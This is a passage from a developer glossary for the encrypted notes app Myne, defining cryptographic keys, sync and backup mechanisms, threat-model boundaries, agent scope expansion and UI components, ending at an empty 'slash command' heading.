### **RustCrypto** &nbsp; 🛠️ *Tooling*

A collection of pure-Rust cryptographic crates (`hkdf`, `chacha20poly1305`, `argon2`, `ml-kem`, `ml-dsa`, etc.). **The primary (and only) primitive provider on Myne's Rust side** (`decisions.md` 2026-04-28, which supersedes the earlier libsodium-bindings clause; `spec/protocol.md` §2 "Library"). `protocol/Cargo.toml` declares **no cryptographic primitive provider outside RustCrypto**: every KDF, AEAD, hash and MAC the protocol specifies comes from `hkdf`, `argon2`, `chacha20poly1305`, `chacha20`, `poly1305`, `sha2` and `pbkdf2` (the RFC 5802/7677 SCRAM KDF), alongside `subtle`, `zeroize` and `getrandom`. The manifest's other entries are not primitive providers and are not claimed to be: `base64` (SCRAM `AuthMessage` serialization), `bip39` (the BIP-39 wordlist and its own internal checksum; the phrase is fed **directly** to RustCrypto's `argon2`, never through BIP-39's PBKDF2 seed step), and `unicode-normalization` (NFKD before Argon2id), `thiserror`, `serde`, `tracing`. The same crate is what the desktop, mobile and, compiled to `wasm32-unknown-unknown`) web clients run, so there is no fallback path and no second Rust implementation to keep in agreement. [libsodium](#libsodium) is not linked anywhere; it remains the **byte-level interoperability reference** the primitive choices are stated against, machine-checked by `myne-test-vectors/`. The `ml-kem` and `ml-dsa` crates are the RustCrypto path the B2B person primitives use today (myne-md/myne#698) and the intended one for the later vault-wide post-quantum work.

Used in: `spec/protocol.md` §2.2

### **salt** &nbsp; 📋 *Protocol*

A non-secret, per-vault random value mixed into KDF input to prevent precomputation attacks across accounts and time. Myne constructs two distinct 16-byte salts — `salt_password` and `salt_recovery` — each from a SHA-256 of `(domain prefix || account_number_hash || random_16_bytes)`, with the random component generated once at vault creation and stored in `vault.meta`.

Used in: `spec/protocol.md` §3.1

### **saved view** &nbsp; 📦 *Product*

A named, **read-only** derived view over a vault's own plain-markdown notes (Saved Views epic, MYND-271) — a filter (over [properties](#property), tags, folders) + a sort + an optional `groupBy`, rendered as one of a closed set of [view types](#view-type). The Obsidian-Bases analogue, deliberately narrowed: **no database, no formula/code-eval** — only a declarative, closed-allow-list query (the query-engine sub-feature) over the derived property index. The view *definition* is authored content persisted in `vault.prefs` / `MYP1` (not the index blob); the data it queries lives in the rebuildable [vault.indices](#vaultindices) / `MYI1` cache. Because it is read-only over plain markdown with `.myn` as the source of truth, it does **not** violate the `vision.md` "no databases" / "no proprietary format" anti-features (same precedent class as the [search index](#search-index)); see `decisions.md` 2026-06-14 "Saved Views is a read-only derived projection over plain markdown, not a database". The [filter AST](#filter-ast) is created and edited through the **filter builder** UI — single-level filter groups over tag / folder / search / [property](#property) conditions, a deliberate representable subset of the AST's full nesting (MYND-282 + its property-condition follow-up).

Used in: Saved Views (MYND-271, MYND-282); `decisions.md` 2026-06-14

### **scheduled backup** &nbsp; 📦 *Product*

An automatic, recurring [vault backup file](#vault-backup-file) written to a user-chosen local folder on a cadence (MYND-351). Runs only while the app is open and the vault is unlocked ("Model A"), driven by an opportunistic elapsed-time check (`now − last success ≥ interval`) on unlock and periodically while unlocked — not a wall-clock timer (auto-lock would starve one). Reuses the manual export path verbatim (no new cryptography; the `.myne-backup` stays exactly as encrypted as the vault). Governed by a device-local [backup schedule](#backup-schedule). Keeps the most recent N (user-set, default 7), pruning only files it wrote. **No email or cloud delivery — ever** (`vision.md` anti-feature); the user's own folder-sync handles offsite. Distinct from [restore (from backup)](#restore-from-backup) and from the manual click-to-back-up action. Leak/egress posture is that of any backup file: `threat-model.md` §7, TB3.

Used in: `decisions.md` 2026-06-18; `agent-tooling/features/scheduled-local-backup/`

### **scope expansion** &nbsp; 📦 *Product*

A widening of an [agent scope](#agent-scope) during a run, approved by the user in an act separate from and prior to approving the diff. It grants **reading and changing** the named notes together, and the approval screen says so in those words: "include this folder" describes a smaller permission than the one being given. A grant is folder-shaped or an explicit note list and is frozen at approval; a live predicate (a tag, a saved search) is not an available shape, because its contents can change after it was granted and the agent can write the very tag that would widen its own scope. An expansion the **model** requests is the injection-reachable path; one the **user** sets is their own act, and the composer's scope control exists so ordinary folder-scale work goes through the second.

Used in: `decisions.md` 2026-08-16

### **screen-capture override** &nbsp; 📦 *Product*

*(Aliases: screen-capture escape, pre-unlock escape hatch. `threat-model.md` §7, `decisions.md` 0562 and the manual-test roster all say `escape`; the component is `ScreenCaptureEscape.tsx`. One thing, listed here under the name the setting carries.)*

The device-local escape hatch from [screen-capture protection](#screen-capture-protection) (myne-md/myne#482). One boolean at `<app_config_dir>/screen-capture.json`, plus a `--disable-screen-capture-protection` process flag that leaves no file at all, reachable from a keyboard-focusable control on every pre-unlock screen and set only through a consent step that states the cost. It exists because the three decisions that made protection always-on before unlock left the toggle sealed inside `vault.prefs` and its control post-unlock, so on Windows a user on remote-control software or a magnifier saw a black window with the account number, the recovery-phrase ceremony and the device-join QR behind it. **Device-wide, not pre-unlock-only** (an override that lapsed at unlock would put the black window straight back) so while it is set the per-vault preference is superseded rather than silently ignored. It is deliberately **not** a sealed store: every keychain-backed store in this codebase is Apple-only, which would have shipped the escape on the two platforms where nothing is claimed and omitted it on the one where the layer works. An unreadable file resolves to protection ON, the opposite direction from [hide vault names](#hide-vault-names) and for the opposite reason, and the process flag is the recovery path for that case. What it discloses at rest is bounded in `threat-model.md` §7.

Used in: `decisions.md` 2026-08-30 (entry 0541); `threat-model.md` §6, §7

### **screen-capture protection** &nbsp; 📦 *Product*

Best-effort native window exclusion preventing OS screen-recording and screenshot APIs from capturing Myne content. Applied at app startup via Tauri's `set_content_protected` (Windows `WDA_EXCLUDEFROMCAPTURE`, macOS `NSWindowSharingNone`). **Effective on Windows 10 build 19041+ only.** The macOS call is still made but nothing is claimed for it. Apple documents `NSWindowSharingNone` as a legacy constant macOS no longer uses and states no public API exists for preventing screen capture. No Linux display server offers an application-requestable exclusion; on KDE Plasma 6.6+ and Hyprland 0.50+ the **user** can configure one as a window rule. `decisions.md` 2026-08-15 supersedes the macOS clause of 2026-05-27. It is always applied before unlock regardless of any saved *vault* preference, with one consented device-local exception: see [screen-capture override](#screen-capture-override) (`decisions.md` 0562).

Used in: `threat-model.md` §6, §7

### **seam contract** &nbsp; 🛠️ *Tooling*

The one assertion suite that pins the behaviour of the [platform seam](#platform-seam), meaning call shape, error propagation, subscribe/unsubscribe lifecycle, and the typed *unsupported* outcome for every seam module. It runs against the **desktop and web** implementations in **both** CI lanes (`tests/platform/seam-contract.ts`, driven by `tauri-seam.test.ts` / `web-seam.test.ts`). It exists because the reason the web client gets no mirror of the desktop E2E suite ("it is the same `src/` tree, only the seam differs") is a *premise*, and an unverified premise is how a divergence ships; the contract turns it into a checked property. It also pins desktop seam behaviour, which nothing pinned before. See also [capability gating](#capability-gating), [single-tab lock](#single-tab-lock).

**Known gap, recorded rather than implied away.** The [platform seam](#platform-seam) got a third implementation in myne#492, `mobile/src/platform/`, and it has no contract driver: `tests/platform/` holds two subjects, not three. So the coverage claim above is exact and deliberately narrower than "every implementation", which is what this entry used to say while a third seam shipped outside it. The suite is already parameterised for a third subject (it takes a `supports` set), so closing the gap is a driver file rather than a redesign; until it lands, mobile's seam is verified by its own specs and by the twin-drift warning, not by this contract.

Used in: `decisions.md` 2026-07-26 (web E2E policy); `docs/dev/e2e.md`; `tests/platform/seam-contract.ts`

### **save readout** &nbsp; 📦 *Product*

The bottom-bar line that says what the current window owes the open note (myne-md/myne#566, reshaped by myne-md/myne#603). Five states, each with its own glyph, so the state is readable without reading the words:

- **`Saved · N min ago`**: a solid dot. Settled, nothing owed.
- **`Editing…`**: `circle-dashed`, still. Written and not yet saved: autosave is armed. The state a whole writing session is spent in, which is why it does not move.
- **`Saving…`**: `loader-circle`, turning, in `--accent`. A disk write, which ends.
- **`Resolving edit conflict…`**: the same turning `loader-circle`. A conflict copy is being written; it also ends.
- **`Save failed · Retry`**: a cross, in `--warning`, with a retry control.

It carried a **sixth, unrelated** fact until #603: whether the note had reached the server. That was drawn with the same glyph as `Editing…`, a pixel to its right, so the readout showed two identical grey marks meaning two different things. Sync debt is its own axis and has its own icon, the [unsynced mark](#unsynced-mark).

Three of the five are [inline status marks](#inline-status-mark); `Saved` and `Save failed` are not, because neither is a degree of progress.

Used in: `src/components/Spinner.tsx`, `src/notes/components/SaveStatus.tsx`

### **search index** &nbsp; 📦 *Product*

Myne's full-text search over note content (MYND-29). A custom in-memory **BM25 inverted index** (AND-of-terms with a last-term prefix match for type-ahead, plus a title-boost) built from decrypted note plaintext while the vault is unlocked, queried in RAM, and persisted as the encrypted `vault.search` blob. Index-side, each note's language is detected (whatlang, EN/TR/DE) and single-stemmed (the raw token is always indexed too); query-side, terms are multi-stemmed across all supported languages (the query is too short to detect a language) — a deliberate index/query asymmetry. The index is **plaintext-derived RAM**, as sensitive as the open notes: zeroized on lock (`threat-model.md` A6), and never the source of truth (the `.myn` files are). Engine choice sits behind a swappable trait; the MYND-29 benchmark (`decisions.md` 2026-05-31) selected the custom engine over tantivy on the budget table. See also [search-index-key](#search-index-key), [fall-to-rebuild](#fall-to-rebuild).

Used in: `spec/protocol.md` §9.6; `decisions.md` 2026-05-31

### **search query language** &nbsp; 📦 *Product*

The operator + boolean syntax the command palette accepts over the [search index](#search-index) (MYND-303 + MYND-307). **Field operators** scope a query — `tag:` (→ [tag index](#tag-index)), `path:` (folder subtree), `content:` / bare terms (full-text), `file:` (title match — a Myne note's title is *derived* from its first heading, so `file:` is a title match, **not** a filename glob), `task:` (notes carrying a task item) — and **boolean/phrase combinators** compose it: implicit AND, `OR`, `-` negation, `( )` grouping, `"exact phrase"`. It is a **frontend parser**: the string compiles to a [saved view](#saved-view) filter tree and is resolved by the same client-side engine + leaf resolvers, so every predicate evaluates over already-decrypted in-RAM state — zero server visibility, no crypto cost, and the BM25 index stays a bag-of-words matcher with no query language of its own. An operator-free query keeps the unchanged BM25 path; `line:` / `section:` / `/regex/` need a post-decrypt body scan and are deferred (Slice B). An unknown `foo:` prefix is literal search text.

Used in: `decisions.md` 2026-07-30

### **graph-layout-key** &nbsp; 🗝️ *Key/identifier*

The 32-byte AEAD KEK encrypting [`vault.graph`](#vaultgraph) (`MYG1`, §9.19). Derived deterministically from `root_key` via the canonical `DeriveSubkey(root_key, "graph-layout-key")` helper (`spec/protocol.md` §3.4 registry entry `"myne.v0.1 graph-layout-key"`). Never persisted; re-derived on each read/write of the layout cache. Independent from the `itemsKey` lineage by design — like `search-index-key` / `ai-embeddings-key` it derives straight from `root_key`, so it survives the later epoch-rotation `itemsKey` evolution. The AAD `AAD_graph_layout_blob` (role `"graph-layout-blob"`, `spec/protocol.md` §5.2) binds the blob to its vault via `account_number_hash`. **DISTINCT** from the AAD role string `"graph-layout-blob"` (a different load-bearing constant).

### **search-index-key** &nbsp; 🗝️ *Key/identifier*

The 32-byte AEAD KEK encrypting `vault.search`. Derived deterministically from `root_key` via the canonical `DeriveSubkey(root_key, "search-index-key")` helper (`spec/protocol.md` §3.4 registry entry `"myne.v0.1 search-index-key"`). Never persisted; re-derived on each unlock (to load / reconcile the index) and on each persist (graceful lock / periodic flush). Independent from the `itemsKey` lineage by design — like `prefs_key` it derives straight from `root_key`, so it survives the later epoch-rotation `itemsKey` evolution. The AAD `AAD_search_index_blob` (role `"search-index-blob"`, `spec/protocol.md` §5.2) binds the blob to its vault via `account_number_hash`.

Used in: `spec/protocol.md` §3.4, §5.2, §9.6

### **service worker** &nbsp; 📦 *Product*

A script the browser installs for an origin and consults for that origin's network requests. In the Phase 3 web client it is the intended **code-pinning** mechanism: once implemented it will serve the bundle it already holds and accept a replacement only when that bundle's hash is *both* signed by a release key the worker carries *and* present in the append-only record of released hashes (which is private today, so "public" describes the intent rather than the state; `decisions.md` entry 0534) — so a bundle substituted *later* cannot reach a client that has already loaded once.

**The policy is fixed; the worker is not built.** `decisions.md` 2026-07-26 settles the update rules deliberately ahead of the implementation, because pinning code and shipping security fixes are in direct tension and resolving that tension inside an update path nobody reviews as a security decision is exactly how the hole reopens. What exists today is that policy alone, extracted as a pure function (`web/src/sw/update-policy.ts`, whose only caller is its unit test): no worker script ships, nothing registers one, and nothing currently pins a loaded bundle. Until one does, the compensating controls that actually ship against [served-code delivery](#served-code-delivery) are the detection-oriented pair — the reproducible bundle build, and the per-release hashes published in [`web-bundle-hashes.md`](web-bundle-hashes.md).

Even fully implemented it stays a partial answer, in two ways that do not go away: it does nothing about *targeted first delivery*, where the very first bundle a user receives is the malicious one; and the browser fetches the worker script itself from the network rather than from the worker's own cache, so an operator controlling the origin can serve a replacement worker that omits the verification. The accurate claim it will buy is the narrow one — every load after the first is as strong as [TB7](#trust-boundary) — never "the web client verifies its own code".

Used in: `threat-model.md` §1 A15, §3 TB11; `decisions.md` 2026-07-26

### **session-state-key** &nbsp; 🗝️ *Key/identifier*

The 32-byte AEAD KEK encrypting `vault.workspace` (the [workspace-state blob](#workspace-state-blob)). Derived deterministically from `root_key` via the canonical `DeriveSubkey(root_key, "session-state-key")` helper (`spec/protocol.md` §3.4 registry entry `"myne.v0.1 session-state-key"`). Never persisted; re-derived on each unlock (to restore the workspace) and on each graceful-exit persist. Independent from the `itemsKey` lineage by design — like `prefs_key` / `search-index-key` it derives straight from `root_key`, so it survives the later epoch-rotation `itemsKey` evolution. The AAD `AAD_workspace_blob` (role `"workspace-blob"`, `spec/protocol.md` §9.7.3) binds the blob to its vault via `account_number_hash`.

Used in: `spec/protocol.md` §3.4, §9.7

### **named workspace** &nbsp; 📦 *Product*

A user-named, switchable editor layout (MYND-308): a stored snapshot of the open-tab set, pane-split layout, focused pane, per-tab cursor/scroll, and per-tab [view mode](#view-mode), recalled under a chosen name ("Writing", "Research"). The [workspace-state blob](#workspace-state-blob) descriptor evolves from a single workspace to **N named [slots](#workspace-slot)** with an `{slots, active}` inner schema — `workspace_format_version` ticks `0x01 → 0x02` (an old binary hits `FormatUnsupported` and defaults to a single empty pane; magic / AAD / HKDF unchanged). Surfaced via a [bottom-bar](#bottom-bar) dropdown + command palette (save-as / switch / rename / delete; no default chord). Switching is **hybrid**: the outgoing slot auto-saves its live layout, plus explicit Save-as / Reset-to-snapshot. The active-slot pointer lives in MYP1 ([`active_workspace`](#vaultprefs), a stable slot id — survives a crash; falls back to the first slot if the named slot is gone). Names + layouts stay inside the AEAD envelope (AS3). Writes are **coalesced** — ≤ once per ~5 min of active use plus graceful exit / auto-lock — a deliberate, bounded relaxation of the §9.7.4 graceful-exit-only cadence (`threat-model.md` §7). See also [workspace slot](#workspace-slot), [workspace-state blob](#workspace-state-blob).

Used in: `spec/protocol.md` §9.7; `threat-model.md` §7; `decisions.md` 2026-06-17 (MYND-308)

### **workspace slot** &nbsp; 📦 *Product*

One [named workspace](#named-workspace) within the `0x02` [workspace-state blob](#workspace-state-blob) descriptor (MYND-308). A slot carries a **stable `id`** (the durable identity — rename never changes it, so the MYP1 [`active_workspace`](#vaultprefs) pointer is rename-free), a display `name`, and the workspace descriptor itself (pane tree, focused pane, per-tab items incl. [view mode](#view-mode)). Slots are opaque to the protocol codec — the desktop client serializes the `{slots, active}` structure and the codec treats it as raw inner bytes (like the pre-0x02 single descriptor). Deleting the last slot leaves a fresh empty "Default" slot (the container is never slotless). See also [named workspace](#named-workspace).

Used in: `spec/protocol.md` §9.7; `decisions.md` 2026-06-17 (MYND-308)

### **workspace-state blob** &nbsp; 📦 *Product*

The encrypted `vault.workspace` artifact (`MYW1`, `spec/protocol.md` §9.7) carrying the editor's **workspace state** — the open-tab set per pane, the recursive pane-split layout, each pane's active tab, the focused pane, per-tab cursor/scroll positions, and per-tab [view mode](#view-mode) (MYND-166; per-tab view mode added by MYND-299, named slots by MYND-308). AS3-Sensitive (note ids + structure): persisting *which notes are open* is activity metadata, so it rides inside the AEAD envelope under [session-state-key](#session-state-key) rather than as plaintext local state. The inner descriptor is client-opaque to the protocol layer (like the [search index](#search-index)); since MYND-308 it holds `{slots, active}` ([named workspaces](#named-workspace)) and `workspace_format_version` is `0x02` (an old `0x01` binary hits `FormatUnsupported` → single empty pane). Write cadence is **graceful-exit only** in the single-workspace baseline (manual lock / idle auto-lock grace / quit, never per tab-switch), **coalesced to ≤ once per ~5 min of active use** once named workspaces are in play (MYND-308 — a bounded relaxation of §9.7.4, `threat-model.md` §7), and on **mobile** resolves "quit" to **app-background** alongside lock, dirty-gated (MYND-561 — the platform has no quit signal; §9.7.4 "Mobile exit analogs") — so the blob's mtime stays a coarse signal, never a high-resolution editor-activity log. Best-effort, not crash-durable; a missing / tampered / malformed / wrong-version blob falls back to a single empty pane (§9.7.4).

### **set-field byte budget** &nbsp; 📋 *Protocol*

The bound a `vault.prefs` write is held to so that the 64 KiB plaintext cap (`spec/protocol.md` §9.5.4) is never reached. It is measured over the WHOLE canonical plaintext, every [content-scaled field](#content-scaled-field) and feature-scaled one together with the retained `field_clocks` tombstones, and it sits at the cap less 4 KiB of headroom in the reference implementation.

**Not a per-field share, and the correction is worth stating** because the first version of this entry described one. Five set fields share one cap, so each of them cannot be granted half of it; and an estimate over one field's live entries can see neither the other four fields nor the tombstones that outlive their entries, so it reports room in a blob already past the cap.

It exists because `deliberate_folders` is the first preference whose size grows with the user's CONTENT rather than with the number of features, and an over-cap `vault.prefs` save fails outright rather than truncating. Without a bound, a vault with enough folders would stop being able to save any preference at all. Past the budget an individual addition is REFUSED and the write still succeeds, so the folder behaves as folders did before [at-fill registration](#at-fill-registration): it exists while it holds a note, and stops existing when the last one leaves. The user is told, because deleting a folder is a real remedy.

Two properties are normative rather than incidental. Refusals are **ordered** shallowest-first then alphabetically, so a full budget leaves the vault's top-level structure standing rather than an arbitrary slice, which is what makes the limit explainable. And a **removal is never refused**. That one is a property rather than an assertion: a removal does not shrink the blob, it trades a live member for a permanent tombstone, and on a folder set the tombstone is the larger of the two. What makes the promise true is that every live entry is charged for the tombstone it will one day mint, so the room a removal needs was reserved when the entry was admitted.

Used in: `spec/protocol.md` §9.5.4; myne-md/myne#613

### **selection toolbar** &nbsp; 📦 *Product*

The floating UI surface that appears above an active text selection in the Phase 1 editor, exposing format actions (bold / italic / strikethrough / inline-code / link / heading dropdown). Positioning uses the shared `src/editor/positioning.ts` helper — `getBoundingClientRect` + viewport-edge clamp + flip-below-when-no-room-above. The 🔗 (link) button opens an **inline URL overlay** adjacent to the selection rather than a `window.prompt()` or modal, matching `PRODUCT.md`'s "modals not as first reach for interaction" anti-pattern. Implemented as a CodeMirror 6 `ViewPlugin` that mounts/unmounts the toolbar based on selection state; absent when the selection is empty. **Opt-out per host since MYND-559:** `myneExtensions` / `CMEditorProps` take `selectionToolbar`, default `true` (desktop), and a host that renders its own formatting surface passes `false` — the plugin is then never constructed, rather than mounted-and-hidden. The mobile client does exactly that, driving formatting from its above-keyboard format bar instead, so on mobile this surface does not exist.

Used in: `agent-tooling/features/editor-mvp-baseline/prd.md`, `agent-tooling/sessions/grill/2026-05-16-mynd-36-editor-inner-scope.md` Q4 + Q8

### **self-host** &nbsp; 📦 *Product*

User-operated deployment of the Myne sync server. First-class in the product plan: same protocol, same security properties as hosted sync. The protocol treats hosted and self-hosted servers as identical trust boundaries (TB5) — the operator does not see plaintext in either case.

Used in: `vision.md`, `threat-model.md` §3

### **self-update** &nbsp; 📦 *Product*

In-app updating of a desktop Myne client. The client fetches a signed per-channel [update manifest](#update-manifest) from the first-party download origin, verifies the offered artifact against the offline release key (the signature check cannot be disabled), refuses on signature or hash failure, and installs only a strictly newer version, never a silent downgrade. Shipped 2026-10-07 (`decisions/clients/0649`), meeting the TB7 crossing condition. Runs host-side: the WebView reaches only the `update` plugin's commands. macOS, Windows and the Linux AppImage self-update; the Android store and the web client do not (the stores own their update, and a served page cannot replace itself). The automatic check is default-on, user-disablable, and the one egress the user has not named a provider for (`decisions/security/0650`).

Used in: `threat-model.md` TB7, §7

### **served-code delivery** &nbsp; ⚠️ *Threat*

The property that distinguishes the web client's code channel from every other one Myne uses: the client program is re-sent from an origin on **every page load**, the browser verifies no signature over it, and the user keeps no artifact afterwards to hash or compare. This makes the origin operator able to serve one identified account modified code and everyone else the honest code, undetectably at the time and in the same page the master password is typed into. It is a **separate boundary (TB11) and a separate adversary (A15)**, not a variant of the distribution channel TB7 describes, whose crossing conditions a served bundle satisfies none of. (This entry called that channel "signed, hash-published, reproducible" until 2026-08-25, and two of the three were wrong: desktop artifacts carry no signature any OS checks and are not reproducible. Hash-published is the one that holds. Entry 0534.) Compensating controls are detection-oriented and close *later substitution*, not *targeted first delivery*. Two of them ship, and one of those two is not yet usable by the reader it is for: the reproducible bundle build, and the per-release bundle hashes written to an append-only record ([`web-bundle-hashes.md`](web-bundle-hashes.md)) that lives in a private repository, so nobody outside the project can look a hash up in it. The third — a [service worker](#service-worker) pinning the code after first load — has its policy fixed (`decisions.md` 2026-07-26) but no implementation, so today nothing bounds a later substitution either.

Used in: `threat-model.md` §1 A15, §3 TB11, §5

### **server-auth subkey** &nbsp; 🗝️ *Key/identifier*

A subkey derived from `root_key` via `derive_key(root_key, "myne.v0.1 server-auth")`. **Active in Phase 2 sync**: it is the high-entropy secret behind the SCRAM handshake — the client proves possession of it at device enroll and on every sync cycle (`core/src/plugins/sync/{cycle,enroll,orchestrator}.rs`), and the server stores only a `StoredKey`/`ServerKey` verifier, so the subkey itself is **never transmitted**. The mechanism choice that `spec/protocol.md` §11.1 deferred (simple verifier vs OPAQUE `export_key`) was resolved to **SCRAM-SHA-256** by `decisions.md` 2026-06-20; the `-PLUS` channel binding named there is currently inert, so the honest posture is SCRAM-SHA-256 over pinned TLS (`decisions.md` 2026-07-13 F5). The OPAQUE upgrade path stays a later-version item.

Used in: `spec/protocol.md` §3.4, §11.1; `spec/server-protocol.md` §3.1; `decisions.md` 2026-06-20

### **serverPassword** &nbsp; 🗝️ *Key/identifier*

A generic term referring to whatever value is sent to the sync server for authentication in Phase 2. The §11.1 choice it stood in for was resolved to **SCRAM-SHA-256** (`decisions.md` 2026-06-20), which sends a *proof* rather than a credential — so the term is retained only as a placeholder for the generic notion, and the protocol still transmits no server credential. See [server-auth subkey](#server-auth-subkey), [per-device token](#per-device-token).

Used in: `spec/protocol.md` §1.1, §11.1; `spec/server-protocol.md` §3.1

### **share-import staging queue** &nbsp; 📋 *Protocol*

The device-local, `MYF1`-sealed queue (`pending-shares/sealed/`, `protocol.md` §9.20) holding a file shared into Myne via the OS share sheet (iOS Share Extension / Android `ACTION_SEND`) until the vault unlocks and it drains into the [attachment library](#attachment) via `attachment_import`. The file-carrying sibling of the [pending-capture queue](#pending-capture) (`MYK1`): same device-key seal and vault-agnostic per-entry-id AAD binding, but a binary payload framed with its filename + declared MIME, a 64 MiB cap, and an attachment (not note) drain target. Device-local (TB2), never synced or backed up.

Used in: `protocol.md` §9.20; `decisions.md` 2026-07-16

### **share_id** &nbsp; 🗝️ *Key/identifier*

The 16-byte random per-entry identifier of a [share-import staging queue](#share-import-staging-queue) blob (`MYF1`, `protocol.md` §9.20.3). Its lowercase-hex form is the on-disk filename under `pending-shares/sealed/`, and it is bound into the blob's AAD (role `"share-import-blob"`) so a tampered header `share_id` fails AEAD rather than silently re-labelling the entry. The binding covers the id in the *header*, not the one in the *filename* — a sealed entry copied to a second filename still opens, which is why §9.20.4 makes the filename/header comparison a reader-side MUST. Vault-agnostic — it binds no `account_number_hash` or `items_key_id`.

Used in: `protocol.md` §9.20.3; `decisions.md` 2026-07-16

### **shared pref** &nbsp; 📋 *Protocol*

One of the two normative [vault.prefs](#vaultprefs) field classes of the Phase 2 prefs sync (`sync-protocol.md` §10.2, MYND-478): a preference that describes the *vault* — identity (`label`, `icon`), content organization (`favorites`, `item_order`, `folder_icons`, `saved_views`), vault-level conventions (the `daily_*` fields), vault-wide privacy declarations (`ai_excluded_folders`), and the cross-device `device_names` map. Shared prefs sync between devices, merging per discipline (scalar/whole-value LWW on [field clocks](#field-clock), set-union, sequence-LWW-on-whole, per-key map). Contrast [device-local pref](#device-local-pref).

Used in: `sync-protocol.md` §10.2; `decisions.md` 2026-07-13

### **session token** &nbsp; 🗝️ *Key/identifier*

An opaque UUIDv4 identifying an in-flight vault-creation session held in the Tauri-managed `VaultCreationState` map between the `begin` and `commit` IPC calls. The session token is **not a secret** — it is a bearer reference to the session row, which contains the actual secret material (`root_key`, password and recovery wrap keys, recovery phrase, account number). Sessions live at most 10 minutes (`SESSION_TTL_SECS`); evicted tokens are tombstoned for up to 1 hour so a subsequent `commit` returns `SessionExpired` instead of the generic `SessionNotFound`.

Used in: `decisions.md` 2026-04-28 "Vault creation flow: backend session pattern", "Vault creation session TTL"

### **scroll-fade edge** &nbsp; 📦 *Product*

The soft top or bottom edge on a scrollable region that says "there is more this way" (myne-md/myne#565). Rendered as a `mask-image` on the SCROLLER, never as an overlay gradient: an overlay has to guess the surface colour behind it, and every theme and every custom palette makes that guess differently, so a mask that fades the content itself is the only form that survives a palette the author never saw.

**Conditional, and that is the whole affordance.** Each edge appears only while there is content past it, so a region whose content fits carries no fade at all. A permanent fade is decoration, and worse, it is a lie about whether scrolling would do anything. The two edges are independent: `data-fade-top` and `data-fade-bottom` are set separately from the scroll position, and their absence is the correct rendering rather than a default.

Masked on the scroller and not on its container, for the reason `CenteredCard` records: a `mask-image` clips the whole rendered box, so masking a card fades its own fill, its hairline and its corners, which is what a card IS.

Used in: `src/hooks/useScrollEdges.ts`, `src/styles/tokens.css`

### **sealed label store** &nbsp; 📋 *Protocol*

The device-local cache that lets the locked [vault picker](#vault-picker) show a vault's real name after a relaunch, when the name itself is AEAD-sealed inside that vault's [vault.prefs](#vaultprefs) and therefore unreadable until unlock. One `MYL1` file per vault at the vault root beside `vault.quickunlock`, sealed under a **per-vault** 32-byte `wrap_key` held in the OS keychain, never a `DeriveSubkey(root_key, …)` subkey: a derived subkey cannot be destroyed on its own while its root survives, so it could not deliver per-vault erase. The per-vault scoping is what preserves vault deletion's per-`VaultId` cryptographic-erase guarantee, since deleting a vault destroys that vault's key. Only a vault this device has unlocked at least once is ever named; there is no key with which to read the label of one it has not. Device-local, never synced, and structurally excluded from the backup container by the `§9.11.3` closed allowlist. See also [hide vault names](#hide-vault-names).

Used in: `spec/protocol.md` §9.22, §10.3; `threat-model.md` §7; `decisions.md` 2026-08-15

### **secret tier** &nbsp; 📦 *Product*

*(Aliases: clipboard sensitivity tier. Myne-divergent: yes, the classification is project-specific.)*

The classification a caller declares when copying a value to the system clipboard, and the thing that decides how hard the OS is asked to hold it. Three values. **Plain** is ordinary content (a note body, a [wikilink](#wikilink), a code block): no device confinement and no expiry, because someone copying a note may legitimately want it on another of their devices. **Tier 1** is the [recovery phrase](#recovery-phrase): OS sensitivity marking is *required for the affordance to exist*, so where a platform cannot confine the item to the device and expire it, the Copy control does not render at all, which in practice means iOS and no Android version. As shipped the iOS arm is held behind a verified-on-hardware constant, so today the control renders nowhere. **Tier 2** is the [account number](#account-number): it ships on every platform with a best-effort clear.

The line between the two secret tiers is the one the threat model already draws. The recovery phrase alone reconstructs the vault; the account number alone does not, because unlocking also needs the master password. The tier is always the caller's statement about the value and is never inferred from its content: a content heuristic fails open on precisely the value nobody anticipated.

Used in: `decisions.md` 2026-08-15 (two secret tiers; recovery-phrase Copy is iOS-only)

### **SHA-256** &nbsp; 🔐 *Primitive*

The 256-bit Secure Hash Algorithm 2 (FIPS 180-4). Used in Myne for: salt construction (§3.1), the CTX commitment outer hash (§5.1), the account-number hash (§8), and HMAC underlying HKDF-SHA-256 (§3.2).

Used in: `spec/protocol.md` §3.1, §5.1, §8.3, §3.2
Reference: FIPS 180-4.

### **SHA-512** &nbsp; 🔐 *Primitive*

The 512-bit Secure Hash Algorithm 2. **Not used by Myne** — referenced only when explaining the standard BIP-39 derivation (PBKDF2-HMAC-SHA512) that Myne explicitly avoids.

Used in: `spec/protocol.md` §7.1

### **sibling notice** &nbsp; 📦 *Product*

The post-recovery notice shown when the just-recovered vault belongs to an [account](#account) holding other vaults. It names how many siblings remain and offers a recover-another path, so a user with several vaults does not silently leave one unrecovered. A count only: it reveals nothing about the other vaults beyond what the [vault picker](#vault-picker) already shows, and when the grouping cannot be read it renders a warning instead of claiming zero siblings.

Used in: `src/screens/vault-recover/PasswordResetStep.tsx`; `design-notes/storage/0580-account-and-vault-split-into-a-client-side-ownership-layer.md`

### **signed bundle update** &nbsp; 📦 *Product*

The verification story the web client is **laid out for but does not yet have**: a released bundle whose hashes are published to a public append-only record, reproducible from source so a third party can rebuild and compare, and structured so it can later enrol in an external code-transparency scheme without restructuring. It is deliberately *detection*, not prevention — it makes a silent later substitution discoverable after the fact, and closes nothing about targeted first delivery. **Two clauses here describe an intent rather than a state, and both were read as fact until 2026-08-25** (`decisions.md` entry 0534). The record of released bundle hashes lives in a private repository today, so the reader this definition addresses cannot open it. And the contrast this entry used to draw against the native `TB7` channel, "where a signature is verified before any code runs and a failed check refuses the update outright", is false in every clause: no desktop artifact carries a signature any OS checks, nothing verifies one at launch, and there is no update for a check to refuse. What genuinely distinguishes `TB7` is persistence: a native artifact is downloaded once and stays on disk, so a substitution reaches only whoever downloaded during the window and the file is still there to compare by hand against the published `SHA256SUMS`. A web bundle is re-sent on every visit, can be aimed at one visitor, and leaves nothing behind to check.

Used in: `threat-model.md` §1 A15, §3 TB11, §4

### **slash command** &nbsp; 📦 *Product*

